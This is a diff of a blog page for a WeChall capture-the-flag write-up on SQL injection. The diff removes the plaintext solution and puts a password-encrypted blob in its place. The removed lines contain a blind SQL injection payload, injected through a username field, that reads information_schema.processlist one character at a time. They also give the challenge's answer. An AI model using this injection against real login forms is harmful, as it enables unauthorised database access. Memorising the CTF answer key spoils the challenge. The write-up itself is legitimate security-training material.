@@ -22,18 +22,19 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"vkkkv.github.io","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.27.0","exturl":true,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"hide","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"base16/tomorrow-night","dark":"base16/tomorrow-night"},"prism":{"light":"prism-tomorrow","dark":"prism-tomorrow"},"copy_button":{"enable":true,"style":"flat"},"fold":{"enable":false,"height":500},"language":true},"bookmark":{"enable":false,"color":"#ff3e3e","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":"disqus","storage":true,"lazyload":false,"nav":null,"activeClass":"disqus"},"stickytabs":false,"motion":{"enable":false,"async":true,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/config.min.js" defer></script>
 
-    <meta name="description" content="Challenge Table Names 的进阶版。题目要求找出隐藏的数据库名和表名，答案格式是： 1database_table 相比第一版，常规的 information_schema.tables &#x2F; database() 路线会被过滤。 Solution 后端查询大致是用隐藏配置拼出完整表名： 12SELECT * FROM &lt;secret_database&gt;.&lt;sec">
+    <meta name="description" content="Here&#39;s something encrypted, password is required to continue reading.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="WeChall - Table Names II">
 <meta property="og:url" content="https://vkkkv.github.io/wp/WeChall/wechall-table-names-2/">
 <meta property="og:site_name" content="Hello Navi">
-<meta property="og:description" content="Challenge Table Names 的进阶版。题目要求找出隐藏的数据库名和表名，答案格式是： 1database_table 相比第一版，常规的 information_schema.tables &#x2F; database() 路线会被过滤。 Solution 后端查询大致是用隐藏配置拼出完整表名： 12SELECT * FROM &lt;secret_database&gt;.&lt;sec">
+<meta property="og:description" content="Here&#39;s something encrypted, password is required to continue reading.">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2026-06-13T11:33:08.000Z">
-<meta property="article:modified_time" content="2026-09-09T02:47:51.471Z">
+<meta property="article:modified_time" content="2026-09-23T06:59:49.176Z">
 <meta property="article:author" content="vkkkv">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="mysql">
+<meta property="article:tag" content="restricted-wechall">
 <meta property="article:tag" content="sql-injection">
 <meta property="article:tag" content="wechall">
 <meta property="article:tag" content="writeup">
@@ -207,7 +208,7 @@ p.spoiler {
   
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+    <div class="sidebar-inner sidebar-overview-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           Table of Contents
@@ -220,7 +221,6 @@ p.spoiler {
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#challenge"><span class="nav-number">1.</span> <span class="nav-text">Challenge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#solution"><span class="nav-number">2.</span> <span class="nav-text">Solution</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -241,12 +241,12 @@ p.spoiler {
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-count">12</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">370</span>
+        <span class="site-state-item-count">328</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -319,7 +319,7 @@ p.spoiler {
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-09 10:47:51" itemprop="dateModified" datetime="2026-09-09T10:47:51+08:00">2026-09-09</time>
+      <time title="Modified: 2026-09-23 14:59:49" itemprop="dateModified" datetime="2026-09-23T14:59:49+08:00">2026-09-23</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -361,30 +361,31 @@ p.spoiler {
     
     
     
-    <div class="post-body" itemprop="articleBody"><h3 id="challenge">Challenge</h3>
-<p>Table Names
-的进阶版。题目要求找出隐藏的数据库名和表名，答案格式是：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">database_table</span><br></pre></td></tr></table></figure>
-<p>相比第一版，常规的 <code>information_schema.tables</code> /
-<code>database()</code> 路线会被过滤。</p>
-<h3 id="solution">Solution</h3>
-<p>后端查询大致是用隐藏配置拼出完整表名：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="operator">&lt;</span>secret_database<span class="operator">&gt;</span>.<span class="operator">&lt;</span>secret_table<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;$username&#x27;</span> <span class="keyword">AND</span> password<span class="operator">=</span><span class="string">&#x27;$password&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>不能直接查 <code>information_schema.tables</code> 时，可以转向
-<code>information_schema.processlist</code>。当前正在执行的 SQL
-文本会出现在 <code>processlist.info</code> 中，而这个 SQL 正好包含完整的
-<code>database.table</code>。</p>
-<p>盲注模板：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>test<span class="string">&#x27; OR IF(</span></span><br><span class="line"><span class="string">  (SELECT ASCII(SUBSTR(info, &lt;pos&gt;, 1)) = &lt;ord&gt;</span></span><br><span class="line"><span class="string">   FROM information_schema.processlist</span></span><br><span class="line"><span class="string">   WHERE info LIKE 0x2553454c45435425</span></span><br><span class="line"><span class="string">   LIMIT 1),</span></span><br><span class="line"><span class="string">  1,</span></span><br><span class="line"><span class="string">  0</span></span><br><span class="line"><span class="string">)#</span></span><br><span class="line"><span class="string">password=test</span></span><br></pre></td></tr></table></figure>
-<p>也可以用二分：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ASCII(SUBSTR(info, <span class="operator">&lt;</span>pos<span class="operator">&gt;</span>, <span class="number">1</span>)) <span class="operator">&gt;</span> <span class="operator">&lt;</span>mid<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
-<p>逐字符恢复 <code>info</code> 后，从 SQL 文本里抽出
-<code>&lt;secret_database&gt;.&lt;secret_table&gt;</code>，再把点号换成下划线提交。</p>
-<p>通过 <code>SUBSTR(info,1,200)</code> 直接从 processlist
-提取完整查询文本，确认当前账号下数据库和表名为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nurfedtables37.userbobbytable7</span><br></pre></td></tr></table></figure>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">nurfedtables37_userbobbytable7</span></span>
-
+    <div class="post-body" itemprop="articleBody"><div class="hbe hbe-container" id="hexo-blog-encrypt"
+     data-hbe-format="4"
+     data-wpm="Oh, this is an invalid password. Check and try again, please."
+     data-whm="Oh, this is an invalid password. Check and try again, please."
+     data-salt="9912b192742ecd9d5169d799bd61b6a2e5cb60123b7758a97bd0077302afc2e6"
+     data-nonce="f086f67c656967d010556289"
+     data-kdf-iterations="600000"
+     data-auto-save="false">
+  <script id="hbeData" type="hbeData">
+    f61e2d5e4a7154ffc3c0087ba198491ba1f4aaf49fa69c4c47af22e71191f803c46ad2c892d9d9b7d6a5da56fca7fde8bb4e566987edfd61b9253250df97d0c011359a5a85537393e2aeb8f3f73f3cf58043c56dcffc22058afbad1bca4f0928ee9e93b680eb62ec64a7a257a4d9c49a2393e1f9d57c5c67b21c464c58755499664e3021bebe82ef056ce7518eedd30e91b920273cd1f1099487bbbad082a0c03c8bc3388ea6fa3e77fdaa53920cfe105ad6436219dad24b933f4b3f35717ed77e72d8c5c473d1ff18ff512a980f538cab9cb54e8d32c4e373d73b36e190704517b26c3a52ad8087b08204063ef0e1923c3853fab908382c959cfc213d6d57fe9e92604f41b527d1f7fead664e6f4c8ff656cc2dc6f24865af3bb7130ab60d719cf9062cd12484da197a82cb4bd5f7866eab6665aced7cb055ed87fcb6839f099ff3cfd706771506d119063d513fea1c70c25543f1b645dd582dae8a62e27045fb3f7043dd1e5baeb8cea59ac1baa121d00b4818037d729bbcf816d0138167fe4ce10401518a73cfd158df9b5333e4aa8398509f9e08cc1bb35b8bae6eaf652d22f2647d4e316ac27ecf8319d3d3f61b592d581f465312ed306ec52b685275748f18a2fcb2503b442896d628a90579f94b5d69b659e98492d1439f20d9b034903be9f9c00ec223d37a873ee4839f941d62f7dba35a947024ef8b738572e4144cd6e88dd5cd4a97615041b14c7eb5bb85775f953602ee588f774f0c94b008e3af6266ec04c6db6fa5746797064eccc07969228c23a07c11a63e0be4f5736e5c0bbf427118ea348836e7a5696e1bbc6d7567181cec92c0e650a5da466d18e8ed538da2f7c0161e72241746b8e309198d5c1bb066b038102a71e4c9362c055f70108f03ae5af1f88e049a60cc3cd40328fcf42c70e1c869c46e7357f8576ab798cdc7c8f2af7941f374c4c161bf542112aa10a9061c63135d75039f061fbf27f1c328c7f3406a390f26c86aa8a3637457cc542a3694fa743c5ff66deec700bae8abbe03c5269e721b46ee369bbd466af1ad5431b33be43d2ea45d3ed52c5946452d8525984ae246e65aac81a1f6203a58c59ba29f40cec072874f57196c3afca3b1078472007b5450101427ff2c07fb584ea429be22129845a359d1f1ac01517c60b40560293fa72eabebebfd5cf56e61cce873cad52ccf1b830c25580ba49fb0356a66c9d83d2f2c1512a15c6a52cee064e270da19a812c09eacd4b11d3d839118357151a6d145fd99dce8e35ce0256f8cd1ed2393e8553d762d43d1f76eb8fef33bccb3dcc2b2705baa4543abbb0dc4538a115545adb37020bddc4616747232f4c303fa2690964a6faa0d455e9d6e5bb83046d5cc9b12156960b08723ba4f77b4a5ca9b812b399d89831587d01a43dcf3e215a03adc3f6945bb150ccbd42ff2f6e77861efb8a280a540d5d87b0fc5937ec873ddf647b8b86139d691c7e79d04494d6d49d1aa8f40c561892b06114382d4c6bf6efabad913069802a07695aa8a1c17d603c643de11ef5a4b18e5402b1be22eb8d9793f440ac49cbd65f165330fe579416db403b3cc888a4362a5605820e344313a9f98e8b753d9da21014fa7231dfe4e977863a29df4a0fe1b15c6f212d0c4de5f713b3a5e3e8d8949ad8fbd67e19ec4cd19d6e9e7cac3e6fd39d86d3a2b32a1671a9976c419d898113612e2110e9513088e677978544680af44ea330c233e7cbcf2f2150d1135dbfb6d9674cfcf28e3e13cb75b4d7078cb86e6422beb18bb175fb80e313da5ed1587fb957d06215c0d74789bc00d508465e65fdf692723eaa40f5211dfc095fc5c41c238226679eb232f0902884f8ea6e780bc91a6e7482ee903eb9620e07944db1fe9ae52c46bc9e5f89ad5f4375f258acdf04b451b8f3e535ac6123bb14933593e5af1f5bd9aaccd6b64ddaeb0e3eb55b4a16572cde9d296191cb4ea9a63c522829524dfa70cd1f63f99744745805f12dcf398caa5ba0f25ec12c3aa89fa46de1ad91776555f3c06f213d0181a9e693519bdc90b900713df9fea5981d234da5144cab9187faf17a871f4c57467674189efeb319680baff2cdfe5c071ee050a2772f4f65cefade2db675f8b02259493e158167b4d45525493c730af2badb6ab742decdf9d41806ad718a9b6c32b91aa51c930d36d04292788d9362ae8a20ce95ddb2d73c0fb6fb8bc9d904de2f1b626aae28d9d725567b220aec8670bf59f6ed142bc4f18066a755418b54b91d0a945d86cd1e527c1262504debe8e66ec2a4701aff2b62b7213ed9f42f447f39007516a417506c2199df07caadc0b4e7e49922ea461a0d79f17e55eb2bd49a7e17e36bb59efa231b795a4e615f95a715af7db26404b934eefdd7f74b8e81b2198904957580c91b935c45ee1720446829fc5ec6d0608e581f77fc371e8fb89bd9178806c5a129e38a5a99edde4b19b3c2fa25f82c1c25cfe8fdb257da35737659ea015368bbae0aa2f6550ac2333d0b76e01f4347e42feed914be4fe356e744e5e508952e5c39c0fd421f25738ad0666535b8644908cab80d4ba092c9da787205852c066b64cb3572a3b2610e91c465f1af9cdad1bbe5a01a6c5c7a129b9050f576ef08d547082c7c7210b059ceb06026685717f809e0fbbbba082669e441071746c523bab42e85d820d2d51a73daf9e95d98777de362ed7b750739325d00643ae437fe43c272e28ca9d280bc4244a1f141272a9140badba36f9c0b0d43e91470856525fdf98c94c50e0788796fc178c9ef36b8f57b6199ba6ab01217b1d7983152eca44815f3c9a8af68f30b1dc6b957ef429302fe8950a5496f03ad743eb0b521e1ec1fe4b00e3ec1284ae96663c1d182d4b6616fe8647b94c1d95788d6af23a5959f3d825d41a56e18f95da6f1015b2d11037e71bb78a905b449e59b18510560bbd834301eb437b8c071b7e18bf88e7a393864ef40295ee58627809d94bc3b0a094506b6c997e43f6e85051e1e1b5618c4dd10359e946d24bf9a8dda1ce2f03e393288108d0a2b9811c55f8f9c760bfb262bcb7bcb92d24ad7bbfa1c90ede01a15d26a2db4b992887485781cfddeb3b7e8d5eb5e738ac3792ffe50fa85e59e8823329577a8860bfe18c059aae7f14ed2c63801b80ca31e485ae343d70b4cdffb4920b90b05d6031007acf6eef50484da5fcfa77ade04a357e10a5bc84bff7186f89ded973e15c9aa60843a623c0c7cf66ee5edaea5139c9df0b355c1f75580551e1d0fadb1eb5ef6c416b23eb6fdb7c515ad19d973b52651d148387d9530770066517f5eca93ab6cc2a10db0c8b58d369ef188a6273b6796d883c484ba2bee2ac11f2cd355b28fe1bb56bad1bda9b1350ef82ef7993458ee2b4dfd1afe258a4febb825b8d2d711901253858bcf26b5b663b24c43393ad68dd2d29b2590b39ac8fd14fdf0ebe647bbcd413e268bbfd6896ff0d9794d6dfa8e114ca2b46a805f24c1d66f4a2737add6273e3027315e1321679dc382a1b03a79c1cc93add74b006d0c6166c8754b0af182ebbbc4a06498de508a11c473b147c011d8bac27c73dd425fab023d56b87ef1b24aed309171b2d4a4bb59aacce06b7390d80970826f36d4fc37a1849fc0d410d50b1a7f5a8be54b93322d62cb74440a1792610743fe0c79d5de668639b7ac3757687783b368647d3b561319217aa81bdf97ec764c389e964162301de52434102a70087955df88069f1817aea8ee5daa5993a1bd7845ca2fe10d218db5efdd7aef84073430fd93e520b387aacc548cf407cbe8a5003bff1c102b1c0236e19008c68db16028125ac7929edb901e71e88d5eb93e820462dee5cf0de9a4c0cf5643bb05f247048728859c5e182978ab1fd4379ecb1fc26f3b1a5dd771da978d387a7d5d3847c54b412c87d48faa6aa6471f6f4f6c9edaa613ccc0f1f9890fd6f2913dc9ff922b3681792d939ebc08e5cbb881faaed624a3631b581040ffb1c7c6f84b19494a120df0b4a147fbd731a09fe66aeccb95cc12277d4e2b7247710a274fbd62e4066daded3e2d980ecee0d8e38c6e41d742aee02920a066b4333ddee061d89de493f7aec3618ebe90f6a611f597ac6f7e5d4b2e149aa1f8b7f489a08f3e6a0084721eb798c57c2b916d115277c71b4cd6eb2ded7c4863f8bb9fc912990080c7259d86125be88dcfeb3e1dea4801695a3c4f1dfbc6b1760ddc40504bcbf34b306511f99cb2632f32379dbfcfdd5c6eb48709ccc2d7f726156fe282e9c2ae1c6791fbdd8479c3ed83fc3c069d0d860a51b7870c7245930c2fd4d409d10a073b6ce6c8449cd452b2834c35f37b988c95449753eef80656bfa7764da3257ea23a7f7bbe7f9038b8b7ad5ba134f1d23a6f98829cbb289cd8a5094e767c798b1cc774522941076be0c563d884b068958369857347c547d0bc88697407642d797779d6490ddaefc4db29b71c91a2b792af018d19270dc491d13f3a4e575d6d42d3c52f42cfb738d7ea6a7a2937b1626394253691e01799578df06e09e87a6263384cff206abc9f4f0f416ced75c7a92785143ba1f3125e5c633a555ce3c04db43537d05c088a0209e367b2f69a747c8b8f9dd3893b9226a18773b4add07287cf8d55e67322cfcb2a293a940405121c5076fd157cc614f2a65bedaf153eec8b79738502491d5c1345bb772aafd645c6fc61c139606abec758da92274a7815cef86210c399726a5d6d50fb3473e09fb3e1b10aad3001dcd011c64186c32f83b7595cf1264853a1d4e2f9bc5c591884f0eddee73fe10a4e2839149bf7a8b5c8aa48ff60ea5673b0c8bec3070048af1b4f53faef545631958529f0f5d081661dbe7cf05c80f80ecec405b9f5e561c487c57700df48d8e8390928dc1d1982f0e734ab1729b96c8cba0570ee9b613c3bdfdd2803d8e73c341914894f75482c3c6d64ce88a97e762a872fc2df52a29d8525b99aa27eb9cf66fdadba29ab7b9e08d0f44d11dc4d2453262af4670d381f595237837659bdcb322fcaed6afd689cb85549680da655a44617c35e80ec9f1c59bbf5c5d69d0942c67a1abd63b7194addd7f80c29b9d136c8ba848c004dfec5419d2746ce5314e4ac1dc75c2f10c7a320ef0fce768531cb3e2c2fc00ad1f6129b6cbacc3e87260663de4f79ec0a05865756834234a723666294275fc6012cccc2418ebeaee9722e620f6749ba6aeade17ba98da1a31cbe2e3703d12ff2cb9d2e19e7103ba094f7062b7543cca44302536ab55522281f8288fdf2bd9f940460b74dcada8c0fce1f763c26a5e11cb849322c6ee5a342f8521e642f1a65eddfa932fbec2b9e1e76230df56896003314d3ebcbd7f100ba89ed3baf1e07bf127ff6e4a4d0b7db8da855692708b9a51e53213c8d836a91189fbb059d5ab4798ff1c6e0f2499a283183485691d2de6b81ca962af1e2f515d5829f6f93e5aeb9fe51a5a2e1bd3179c354d17b3e176b1c0e3b8d77ce4d077e5b8a21dfa14a74fe0a804a73604e88694caf29ac693ac04f3f46dd6ca3a42c87290df403fe886ae7a5fed58e551a7c
+  </script>
+  <div class="hbe hbe-content">
+    <form id="hbeForm" class="hbe hbe-form" onsubmit="return false">
+      <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
+      </label>
+    </div>
+      <button class="hbe hbe-button" type="submit">Decrypt</button>
+      <div class="hbe hbe-error" role="alert" aria-live="polite"></div>
+    </form>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.51dd9f3b98.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
     </div>
 
     
@@ -430,6 +431,7 @@ p.spoiler {
               <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
               <a href="/tags/writeup/" rel="tag"><i class="fa fa-tag"></i> writeup</a>
               <a href="/tags/sql-injection/" rel="tag"><i class="fa fa-tag"></i> sql-injection</a>
+              <a href="/tags/restricted-wechall/" rel="tag"><i class="fa fa-tag"></i> restricted-wechall</a>
               <a href="/tags/wechall/" rel="tag"><i class="fa fa-tag"></i> wechall</a>
               <a href="/tags/mysql/" rel="tag"><i class="fa fa-tag"></i> mysql</a>
           </div>
